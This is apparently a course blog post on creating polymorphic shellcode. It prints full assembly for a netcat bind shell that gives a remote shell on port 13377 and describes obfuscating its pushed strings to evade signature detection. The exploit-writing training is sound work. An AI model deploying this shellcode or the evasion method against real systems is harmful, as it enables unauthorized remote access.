---
title:  Assignment 6
description: Create Polymorphic Versions of Sample Shellcode
order: 6
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

For this assignment we will be creating polymorphic versions of sample shellcode from [shell-storm](shell-storm.org).

The first shellcode we will be transforming is the [netcat bindshell](http://shell-storm.org/shellcode/files/shellcode-804.php), shown below:

```nasm
; netcat_bind_shell.nasm
;  - Listen on port 13377 using netcat and provide shell

    global _start

section .text
_start:

        xor eax,eax
        xor edx,edx
        push 0x37373333         ; 7733
        push 0x3170762d         ; 1pv-
        mov edx, esp

        push eax
        push 0x68732f6e         ; hs/n
        push 0x69622f65         ; ib/e
        push 0x76766c2d         ; vvl-
        mov ecx,esp

        push eax
        push 0x636e2f2f         ; cn//
        push 0x2f2f2f2f         ; ////
        push 0x6e69622f         ; nib/
        mov ebx, esp

        push eax
        push edx
        push ecx
        push ebx
        xor edx,edx
        mov  ecx,esp
        mov al,11               ; execve
        int 0x80
```

It seems there are several ways we can morph this shellcode.  First, we should obfuscate all those push commands, since they contain the string we intend to execute.  We can do this by saving each string in a register first, adding a constant to it, then pushing it.


You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6).

<br>
{% include preamble.md %}

[&lt;&lt; Go Back]({{ site.baseurl }})
